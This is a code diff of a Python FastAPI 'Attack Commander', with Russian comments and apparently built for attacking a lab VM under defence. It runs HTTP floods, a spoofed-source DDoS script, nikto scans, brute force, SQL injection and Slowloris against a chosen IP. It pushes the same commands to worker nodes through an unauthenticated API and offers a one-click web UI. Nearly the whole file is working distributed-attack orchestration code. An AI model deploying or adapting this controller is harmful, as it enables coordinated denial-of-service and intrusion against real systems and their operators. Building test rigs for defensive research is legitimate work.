@@ -1,135 +1,204 @@
 """
-COMMANDER — главная атакующая нода.
-Запускается на atk-1, имеет REST API.
-Рабочие ноды (workers) сами подключаются к ней и получают команды.
+COMMANDER — главная атакующая нода (atk-1).
+Push-модель: командер сам толкает команды воркерам, воркеры ничего не знают о командере.
+
+Установка воркеров:
+  1. Запустить agent.py на каждом воркере (install_worker.sh)
+  2. Добавить воркера в UI или через API: POST /workers/add {"ip": "192.168.10.3"}
 
 API:
-  GET  /status         — статус всех нод + текущая атака
-  POST /attack/start   — запустить атаку на всех
-  POST /attack/stop    — остановить
-  GET  /workers        — список подключённых нод
-  POST /attack/single  — атака только с командера
+  GET    /status          — общий статус
+  GET    /workers         — список воркеров
+  POST   /workers/add     — добавить воркера  {"ip": "..."}
+  DELETE /workers/{ip}    — удалить воркера
+  POST   /attack/start    — запустить атаку   {"attack_type": "flood", "target": "..."}
+  POST   /attack/stop     — остановить всех
+  POST   /target          — установить цель   {"target": "..."}
+  GET    /ui              — веб-интерфейс
 """
 
 import os
+import sys
 import time
-import asyncio
-import threading
+import socket
 import subprocess
+import threading
 import logging
+import requests
 from fastapi import FastAPI
 from fastapi.responses import HTMLResponse
-from pydantic import BaseModel
 import uvicorn
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
 logger = logging.getLogger("commander")
 
-TARGET = os.getenv("TARGET_IP", "10.0.0.1")   # IP защищаемой ВМ
-PORT   = int(os.getenv("CMD_PORT", 5000))
+TARGET  = os.getenv("TARGET_IP", "")
+PORT    = int(os.getenv("CMD_PORT", 5000))
+W_PORT  = int(os.getenv("WORKER_PORT", 5001))
+
+# Путь к скриптам атак — рядом с этим файлом
+_HERE = os.path.dirname(os.path.abspath(__file__))
+A = lambda name: os.path.join(_HERE, "attacks", name)
 
 app = FastAPI(title="Attack Commander")
 
-# ─── Глобальное состояние ────────────────────────────────────────────────────
 state = {
-    "current_attack": None,
-    "workers":        {},     # worker_id → {ip, last_seen, attack}
-    "attack_active":  False,
     "target":         TARGET,
+    "attack_active":  False,
+    "current_attack": None,
+    "workers": {},  # ip → {ip, hostname, status, last_checked}
 }
 
-current_proc = None   # subprocess атаки командера
+current_proc = None
 
 
-# ─── Модели ──────────────────────────────────────────────────────────────────
-class AttackCmd(BaseModel):
-    attack_type: str      # flood|ddos|scan|brute|sqli|slowloris|flash|slow
-    target:      str = "" # если пусто — берём из state
-    duration:    int = 60 # секунды
-
-
-class WorkerHeartbeat(BaseModel):
-    worker_id: str
-    ip:        str
-    status:    str = "idle"
-
-
-# ─── Атаки командера ─────────────────────────────────────────────────────────
+# ─── Локальные атаки командера ────────────────────────────────────────────────
 ATTACKS = {
-    "flood":     lambda t: ["ab", "-n", "100000", "-c", "300", "-q", f"http://{t}/"],
+    "flood":     lambda t: ["ab", "-n", "500000", "-c", "300", "-q", f"http://{t}/"],
     "scan":      lambda t: ["nikto", "-h", f"http://{t}", "-maxtime", "120s", "-quiet"],
-    "brute":     lambda t: ["python3", "/app/attacks/brute.py", t],
-    "sqli":      lambda t: ["python3", "/app/attacks/sqli.py", t],
-    "slowloris": lambda t: ["python3", "/app/attacks/slowloris.py", t],
+    "brute":     lambda t: [sys.executable, A("brute.py"), t],
+    "sqli":      lambda t: [sys.executable, A("sqli.py"), t],
+    "slowloris": lambda t: [sys.executable, A("slowloris.py"), t],
     "flash":     lambda t: ["wrk", "-t4", "-c50", "-d60s", f"http://{t}/"],
     "slow":      lambda t: ["wrk", "-t2", "-c20", "-d60s", f"http://{t}/search"],
-    "ddos":      lambda t: ["python3", "/app/attacks/ddos_spoof.py", t],
+    "ddos":      lambda t: [sys.executable, A("ddos_spoof.py"), t],
 }
 
 
-def run_local_attack(attack_type: str, target: str):
+def run_local(attack_type: str, target: str):
     global current_proc
     if current_proc and current_proc.poll() is None:
         current_proc.terminate()
-
     cmd = ATTACKS.get(attack_type, ATTACKS["flood"])(target)
-    logger.info(f"[commander] Запускаю: {' '.join(cmd)}")
+    logger.info(f"[local] {attack_type} → {target}")
     try:
-        current_proc = subprocess.Popen(cmd)
+        current_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except FileNotFoundError as e:
         logger.error(f"Команда не найдена: {e}")
 
 
-def stop_local_attack():
+def stop_local():
     global current_proc
     if current_proc and current_proc.poll() is None:
         current_proc.terminate()
-        current_proc = None
-        logger.info("[commander] Атака остановлена")
+    current_proc = None
+
+
+# ─── Управление воркерами (push) ──────────────────────────────────────────────
+def push_all(endpoint: str, data: dict | None = None):
+    """Отправить команду всем воркерам параллельно."""
+    def _send(ip: str):
+        try:
+            url = f"http://{ip}:{W_PORT}/{endpoint}"
+            r = requests.post(url, json=data or {}, timeout=3)
+            state["workers"][ip]["status"] = r.json().get("status", "ok")
+        except Exception as e:
+            state["workers"][ip]["status"] = "offline"
+            logger.warning(f"[{ip}] недоступен: {e}")
+
+    threads = [threading.Thread(target=_send, args=(ip,), daemon=True)
+               for ip in list(state["workers"])]
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join(timeout=4)
+
+
+def check_worker(ip: str):
+    """Проверить статус одного воркера."""
+    try:
+        r = requests.get(f"http://{ip}:{W_PORT}/status", timeout=2)
+        info = r.json()
+        state["workers"][ip].update({
+            "hostname":     info.get("host", ip),
+            "status":       info.get("status", "idle"),
+            "last_checked": time.time(),
+        })
+    except Exception:
+        if ip in state["workers"]:
+            state["workers"][ip]["status"] = "offline"
+
+
+def check_all_workers():
+    threads = [threading.Thread(target=check_worker, args=(ip,), daemon=True)
+               for ip in list(state["workers"])]
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join(timeout=3)
+
+
+def _bg_refresh():
+    while True:
+        time.sleep(5)
+        if state["workers"]:
+            check_all_workers()
+
+
+threading.Thread(target=_bg_refresh, daemon=True).start()
 
 
 # ─── API ─────────────────────────────────────────────────────────────────────
 @app.get("/status")
-def status():
-    now = time.time()
-    alive_workers = {
-        wid: info for wid, info in state["workers"].items()
-        if now - info["last_seen"] < 15
-    }
+def get_status():
+    online = sum(1 for w in state["workers"].values()
+                 if w.get("status") not in ("offline", "checking"))
     return {
         "target":         state["target"],
         "attack_active":  state["attack_active"],
         "current_attack": state["current_attack"],
-        "workers_online": len(alive_workers),
-        "workers":        alive_workers,
+        "workers_total":  len(state["workers"]),
+        "workers_online": online,
+        "workers":        state["workers"],
     }
 
 
 @app.get("/workers")
-def workers():
-    now = time.time()
-    return {
-        wid: {**info, "alive": (now - info["last_seen"]) < 15}
-        for wid, info in state["workers"].items()
-    }
+def get_workers():
+    return state["workers"]
+
+
+@app.post("/workers/add")
+def add_worker(body: dict):
+    ip = (body.get("ip") or "").strip()
+    if not ip:
+        return {"error": "ip required"}
+    if ip not in state["workers"]:
+        state["workers"][ip] = {
+            "ip":           ip,
+            "hostname":     ip,
+            "status":       "checking",
+            "last_checked": 0,
+        }
+        threading.Thread(target=check_worker, args=(ip,), daemon=True).start()
+    return {"added": ip, "total": len(state["workers"])}
+
+
+@app.delete("/workers/{worker_ip}")
+def remove_worker(worker_ip: str):
+    state["workers"].pop(worker_ip, None)
+    return {"removed": worker_ip, "total": len(state["workers"])}
 
 
 @app.post("/attack/start")
-def start_attack(cmd: AttackCmd):
-    target = cmd.target or state["target"]
-    state["current_attack"] = cmd.attack_type
+def start_attack(body: dict):
+    attack_type = body.get("attack_type", "flood")
+    target      = body.get("target") or state["target"]
+    if not target:
+        return {"error": "target IP not set — установи цель сначала"}
+
     state["attack_active"]  = True
+    state["current_attack"] = attack_type
     state["target"]         = target
 
-    # Запустить атаку локально на командере
-    run_local_attack(cmd.attack_type, target)
+    run_local(attack_type, target)
+    push_all("run", {"attack_type": attack_type, "target": target})
 
-    logger.info(f"[commander] Атака {cmd.attack_type} → {target} | "
-                f"воркеров: {len(state['workers'])}")
+    logger.info(f"Атака {attack_type} → {target} | воркеров: {len(state['workers'])}")
     return {
-        "status": "started",
-        "attack": cmd.attack_type,
-        "target": target,
+        "status":           "started",
+        "attack":           attack_type,
+        "target":           target,
         "workers_notified": len(state["workers"]),
     }
 
@@ -138,119 +207,211 @@ def start_attack(cmd: AttackCmd):
 def stop_attack():
     state["attack_active"]  = False
     state["current_attack"] = None
-    stop_local_attack()
+    stop_local()
+    push_all("stop")
     return {"status": "stopped"}
-
-
-@app.post("/worker/heartbeat")
-def worker_heartbeat(hb: WorkerHeartbeat):
-    """Воркеры сами регистрируются и получают текущую команду."""
-    state["workers"][hb.worker_id] = {
-        "ip":        hb.ip,
-        "last_seen": time.time(),
-        "status":    hb.status,
-    }
-    # Вернуть текущую команду воркеру
-    return {
-        "attack_active":  state["attack_active"],
-        "current_attack": state["current_attack"],
-        "target":         state["target"],
-    }
-
-
-@app.get("/target")
-def get_target():
-    return {"target": state["target"]}
 
 
 @app.post("/target")
 def set_target(body: dict):
-    state["target"] = body.get("target", state["target"])
+    state["target"] = (body.get("target") or state["target"]).strip()
     return {"target": state["target"]}
 
 
-# ─── Веб-интерфейс (простой) ──────────────────────────────────────────────────
+# ─── Веб-интерфейс ────────────────────────────────────────────────────────────
 @app.get("/ui", response_class=HTMLResponse)
 def ui():
-    return """<!DOCTYPE html>
+    return _UI_HTML
+
+
+_UI_HTML = """<!DOCTYPE html>
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
 <title>Attack Commander</title>
 <style>
-  body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
-  h1 { color: #f00; }
-  button { background: #333; color: #0f0; border: 1px solid #0f0;
-           padding: 8px 18px; margin: 4px; cursor: pointer; font-size: 14px; }
-  button:hover { background: #0f0; color: #000; }
-  button.stop { border-color: #f00; color: #f00; }
-  button.stop:hover { background: #f00; color: #000; }
-  input { background: #222; color: #0f0; border: 1px solid #0f0;
-          padding: 6px; font-size: 14px; width: 200px; }
-  #status { margin-top: 20px; white-space: pre; font-size: 13px; }
-  .section { margin: 16px 0; border-left: 3px solid #0f0; padding-left: 12px; }
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: monospace; background: #0d0d0d; color: #bbb; padding: 16px; }
+h1 { color: #e33; margin-bottom: 14px; font-size: 20px; }
+
+.topbar { display: flex; gap: 24px; background: #161616; border: 1px solid #2a2a2a;
+          border-radius: 5px; padding: 10px 16px; margin-bottom: 14px; font-size: 13px; }
+.topbar .lbl { color: #555; }
+.topbar .val { color: #eee; }
+.topbar .val.active { color: #fa0; font-weight: bold; }
+
+.grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 12px; }
+.card { background: #161616; border: 1px solid #2a2a2a; border-radius: 5px; padding: 14px; }
+.card h3 { color: #ddd; font-size: 13px; margin-bottom: 10px; border-bottom: 1px solid #222; padding-bottom: 6px; }
+
+input { width: 100%; background: #1e1e1e; color: #ccc; border: 1px solid #333;
+        border-radius: 4px; padding: 7px 10px; font-size: 13px; margin-bottom: 8px; }
+input:focus { outline: none; border-color: #555; }
+
+.btn { background: #1e1e1e; border: 1px solid #0af; color: #0af; border-radius: 4px;
+       padding: 6px 13px; cursor: pointer; font-size: 13px; margin: 3px 2px; }
+.btn:hover { background: #0af; color: #000; }
+.btn.red  { border-color: #e44; color: #e44; }
+.btn.red:hover  { background: #e44; color: #fff; }
+.btn.green { border-color: #4c4; color: #4c4; }
+.btn.green:hover { background: #4c4; color: #000; }
+.btn.full { width: 100%; margin: 6px 0 0; }
+
+.attacks { display: flex; flex-wrap: wrap; gap: 4px; margin-bottom: 8px; }
+
+.worker { display: flex; align-items: center; justify-content: space-between;
+          padding: 6px 0; border-bottom: 1px solid #1e1e1e; font-size: 12px; }
+.worker:last-child { border-bottom: none; }
+.dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 6px; }
+.idle     .dot { background: #4c4; }
+.attacking .dot { background: #fa0; }
+.offline  .dot { background: #e44; }
+.checking .dot { background: #666; }
+.worker-name { color: #ccc; }
+.worker-ip   { color: #555; margin-left: 6px; }
+.worker-st   { color: #666; margin: 0 8px; }
+
+#log { height: 110px; overflow-y: auto; background: #0a0a0a; border: 1px solid #1e1e1e;
+       border-radius: 4px; padding: 8px; font-size: 12px; color: #666; }
+.log-ts { color: #333; }
 </style>
 </head>
 <body>
-<h1>⚔  ATTACK COMMANDER</h1>
+<h1>⚔ ATTACK COMMANDER</h1>
 
-<div class="section">
-  <b>Цель:</b>
-  <input id="target" value="" placeholder="IP защищаемой ВМ" />
-  <button onclick="setTarget()">Установить</button>
+<!-- Статус-бар -->
+<div class="topbar">
+  <span><span class="lbl">Цель: </span><span id="sb-target" class="val">—</span></span>
+  <span><span class="lbl">Атака: </span><span id="sb-attack" class="val">—</span></span>
+  <span><span class="lbl">Воркеры: </span><span id="sb-workers" class="val">0/0</span></span>
+  <span><span class="lbl">Статус: </span><span id="sb-status" class="val">idle</span></span>
 </div>
 
-<div class="section">
-  <b>Запустить атаку:</b><br><br>
-  <button onclick="attack('flood')">🌊 HTTP Flood</button>
-  <button onclick="attack('ddos')">💥 DDoS (500 IP)</button>
-  <button onclick="attack('scan')">🔍 Сканирование (nikto)</button>
-  <button onclick="attack('brute')">🔑 Brute Force /login</button>
-  <button onclick="attack('sqli')">💉 SQL Injection</button>
-  <button onclick="attack('slowloris')">🐢 Slowloris</button>
-  <button onclick="attack('flash')">⚡ Flash Crowd (легитим)</button>
-  <button onclick="attack('slow')">🌙 Медленный флуд</button>
-  <br><br>
-  <button class="stop" onclick="stop()">⛔ СТОП — все атаки</button>
+<div class="grid">
+
+  <!-- Цель + атаки -->
+  <div class="card">
+    <h3>🎯 ЦЕЛЬ И АТАКИ</h3>
+    <input id="target-ip" placeholder="IP защищаемой VM (напр. 192.168.10.5)">
+    <button class="btn" onclick="setTarget()">Установить цель</button>
+    <br><br>
+    <div class="attacks">
+      <button class="btn" onclick="attack('flood')">🌊 HTTP Flood</button>
+      <button class="btn" onclick="attack('ddos')">💥 DDoS Spoof</button>
+      <button class="btn" onclick="attack('scan')">🔍 Nikto Scan</button>
+      <button class="btn" onclick="attack('brute')">🔑 Brute Force</button>
+      <button class="btn" onclick="attack('sqli')">💉 SQL Inject</button>
+      <button class="btn" onclick="attack('slowloris')">🐢 Slowloris</button>
+      <button class="btn" onclick="attack('flash')">⚡ Flash Crowd</button>
+      <button class="btn" onclick="attack('slow')">🌙 Медл. флуд</button>
+    </div>
+    <button class="btn red full" onclick="stopAll()">⛔ СТОП — остановить всё</button>
+  </div>
+
+  <!-- Воркеры -->
+  <div class="card">
+    <h3>📡 ВОРКЕРЫ <span id="w-count" style="color:#555">(0)</span></h3>
+    <input id="worker-ip" placeholder="IP воркера (напр. 192.168.10.3)">
+    <button class="btn green" onclick="addWorker()">➕ Добавить воркера</button>
+    <div id="workers-list" style="margin-top:10px">
+      <span style="color:#444;font-size:12px">Нет воркеров. Запусти install_worker.sh на нодах и добавь их IP сюда.</span>
+    </div>
+  </div>
+
 </div>
 
-<div class="section">
-  <b>Статус (обновляется каждые 3 сек):</b>
-  <div id="status">загрузка...</div>
+<!-- Лог -->
+<div class="card">
+  <h3>📋 ЛОГ</h3>
+  <div id="log"></div>
 </div>
 
 <script>
-const BASE = window.location.origin;
+const B = window.location.origin;
 
-async function attack(type) {
-  const target = document.getElementById('target').value;
-  const r = await fetch(BASE + '/attack/start', {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({attack_type: type, target: target})
-  });
-  const d = await r.json();
-  console.log(d);
-}
-
-async function stop() {
-  await fetch(BASE + '/attack/stop', {method:'POST'});
+function ts() { return new Date().toLocaleTimeString(); }
+function log(msg, color) {
+  const d = document.getElementById('log');
+  d.innerHTML = `<span class="log-ts">[${ts()}]</span> <span style="color:${color||'#8af'}">${msg}</span><br>` + d.innerHTML;
 }
 
 async function setTarget() {
-  const t = document.getElementById('target').value;
-  await fetch(BASE + '/target', {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({target: t})
-  });
+  const t = document.getElementById('target-ip').value.trim();
+  if (!t) return;
+  await fetch(B+'/target', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target:t})});
+  log(`Цель → ${t}`);
+  refresh();
+}
+
+async function addWorker() {
+  const ip = document.getElementById('worker-ip').value.trim();
+  if (!ip) return;
+  const r = await fetch(B+'/workers/add', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ip})});
+  const d = await r.json();
+  if (d.error) { log('❌ '+d.error, '#e44'); return; }
+  document.getElementById('worker-ip').value = '';
+  log(`Воркер добавлен: ${ip}`, '#4c4');
+  refresh();
+}
+
+async function removeWorker(ip) {
+  await fetch(B+'/workers/'+encodeURIComponent(ip), {method:'DELETE'});
+  log(`Воркер удалён: ${ip}`, '#e44');
+  refresh();
+}
+
+async function attack(type) {
+  const target = document.getElementById('target-ip').value.trim();
+  const r = await fetch(B+'/attack/start', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({attack_type:type, target:target||undefined})});
+  const d = await r.json();
+  if (d.error) { log('❌ '+d.error, '#e44'); return; }
+  log(`▶ ${type} → ${d.target}  (воркеров: ${d.workers_notified})`, '#fa0');
+}
+
+async function stopAll() {
+  await fetch(B+'/attack/stop', {method:'POST'});
+  log('⛔ Остановлено', '#e44');
+}
+
+function dotCls(s) {
+  return {attacking:'attacking', offline:'offline', checking:'checking'}[s] || 'idle';
 }
 
 async function refresh() {
-  const r = await fetch(BASE + '/status');
+  const r = await fetch(B+'/status');
   const d = await r.json();
-  document.getElementById('target').placeholder = d.target;
-  document.getElementById('status').textContent = JSON.stringify(d, null, 2);
+
+  document.getElementById('sb-target').textContent  = d.target || '—';
+  document.getElementById('sb-attack').textContent  = d.current_attack || '—';
+  document.getElementById('sb-workers').textContent = d.workers_online+'/'+d.workers_total;
+  const se = document.getElementById('sb-status');
+  se.textContent = d.attack_active ? (d.current_attack || 'active') : 'idle';
+  se.className   = 'val' + (d.attack_active ? ' active' : '');
+
+  if (!document.getElementById('target-ip').value && d.target)
+    document.getElementById('target-ip').value = d.target;
+
+  const keys = Object.keys(d.workers);
+  document.getElementById('w-count').textContent = '('+keys.length+')';
+  const wl = document.getElementById('workers-list');
+  if (!keys.length) {
+    wl.innerHTML = '<span style="color:#444;font-size:12px">Нет воркеров. Запусти install_worker.sh на нодах и добавь их IP сюда.</span>';
+  } else {
+    wl.innerHTML = keys.map(ip => {
+      const w = d.workers[ip];
+      const s = w.status || 'checking';
+      const name = (w.hostname && w.hostname !== ip) ? w.hostname : '';
+      return `<div class="worker ${dotCls(s)}">
+        <span>
+          <span class="dot"></span>
+          <span class="worker-name">${name}</span>
+          <span class="worker-ip">${ip}</span>
+        </span>
+        <span class="worker-st">${s}</span>
+        <button class="btn red" style="padding:2px 8px;font-size:11px" onclick="removeWorker('${ip}')">✕</button>
+      </div>`;
+    }).join('');
+  }
 }
 
 setInterval(refresh, 3000);
@@ -261,4 +422,6 @@ refresh();
 
 
 if __name__ == "__main__":
+    my_ip = socket.gethostbyname(socket.gethostname())
+    logger.info(f"Commander ready — http://{my_ip}:{PORT}/ui")
     uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="warning")
